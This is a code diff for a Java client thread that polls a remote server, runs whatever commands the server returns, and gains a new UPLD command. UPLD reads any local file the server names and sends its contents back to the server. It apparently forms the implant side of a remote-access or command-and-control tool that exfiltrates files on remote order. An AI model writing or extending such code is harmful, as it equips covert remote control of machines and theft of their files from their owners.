@@ -1,17 +1,19 @@
 package client;
 
 import java.io.BufferedReader;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.PrintWriter;
+import java.io.OutputStream;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.URL;
 import java.net.URLConnection;
+import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.HashMap;
 
@@ -97,6 +99,38 @@ public class Client extends Thread {
 			
 		});
 		
+		// Upload a file
+		commands.put("UPLD", new Command(){
+
+			@Override
+			public String exec(ParsedCommand pCmd) {
+				try {
+					
+					// Reading file
+					ArrayList<Byte> tmp = new ArrayList<Byte>();
+					InputStream in = new FileInputStream(pCmd.args[0]);
+					int c;
+					while ((c = in.read()) != -1)
+						tmp.add((byte) c);
+					in.close();
+					
+					// Building payload
+					byte[] payload = new byte[tmp.size()];
+					for (int i = 0; i < tmp.size(); i++)
+						payload[i] = tmp.get(i);
+					
+					// Sending request
+					sendAsync("UPLD " + pCmd.args[1], payload);
+					
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				return null;
+			}
+			
+		});
+		
 		// ADD COMMANDS HERE
 	}
 	
@@ -104,24 +138,19 @@ public class Client extends Thread {
 	public void run(){
 		
 		try {
-			id = Integer.parseInt(
-					send("GETID " + getIdentity()));
-		} catch (Exception e) {
+			id = Integer.parseInt(send("GETID " + getIdentity()));
+		} catch (NumberFormatException | SocketException e1) {
 			// TODO Auto-generated catch block
-			e.printStackTrace();
+			e1.printStackTrace();
 		}
 		
 		while (true) {
-			sendAsync("PING " + id, "", new Callback(){
+			
+			String response = send("PING " + id, new byte[] {});
+			ParsedCommand pCmd = new ParsedCommand(response);
+			if (commands.containsKey(pCmd.cmd))
+				commands.get(pCmd.cmd).exec(pCmd);
 
-				@Override
-				public void run(String response) {
-					ParsedCommand pCmd = new ParsedCommand(response);
-					if (commands.containsKey(pCmd.cmd))
-						commands.get(pCmd.cmd).exec(pCmd);
-				}
-				
-			});
 			try {
 				Thread.sleep(REFRESH_COOLDOWN);
 			} catch (InterruptedException e) {
@@ -183,29 +212,32 @@ public class Client extends Thread {
 	private String send(String request, byte[] payload) {
 		Socket socket;
 		
+		byte[] CRLF = new byte[] {13, 10};
+		
 		try {
 			socket = new Socket(SERVER_URL, SERVER_PORT);
 		
-			PrintWriter out = new PrintWriter(socket.getOutputStream());
+			OutputStream out = socket.getOutputStream();
+			InputStream in = socket.getInputStream();
 			
-			BufferedReader in = new BufferedReader(
-					new InputStreamReader(socket.getInputStream()));
-			
-			out.println(payload.length);
-			out.println(request);
-			
-			for (int i = 0; i < payload.length; i++)
-				out.write(payload[i]);
+			out.write(Integer.toString(payload.length).getBytes());
+			out.write(CRLF);
+			out.write(request.getBytes());
+			out.write(CRLF);
+			out.write(payload);
 			
 			out.flush();
 			
-			String line = in.readLine();
+			StringBuilder line = new StringBuilder();
+			int c;
+			while ((c = in.read()) != -1)
+				line.append((char) c);
 			
 			out.close();
 			in.close();
 			socket.close();
 			
-			return line;
+			return line.toString();
 		
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
@@ -215,17 +247,13 @@ public class Client extends Thread {
 		}
 	}
 	
-	private String send(String request, String payload) {
-		return send(request, payload.getBytes());
-	}
-	
 	private String send(String request) {
 		
 		return send(request, new byte[] {});
 		
 	}
 	
-	private void sendAsync(String request, String payload, Callback callback) {
+	private void sendAsync(String request, byte[] payload, Callback callback) {
 		
 		new Thread(new Runnable(){
 
@@ -239,7 +267,7 @@ public class Client extends Thread {
 		
 	}
 	
-	private void sendAsync(String request, String payload) {
+	private void sendAsync(String request, byte[] payload) {
 		sendAsync(request, payload, new Callback(){
 
 			@Override
@@ -249,6 +277,10 @@ public class Client extends Thread {
 			}
 			
 		});
+	}
+	
+	private void sendAsync(String request, String payload) {
+		sendAsync(request, payload.getBytes());
 	}
 	
 	private void sendAsync(String request) {
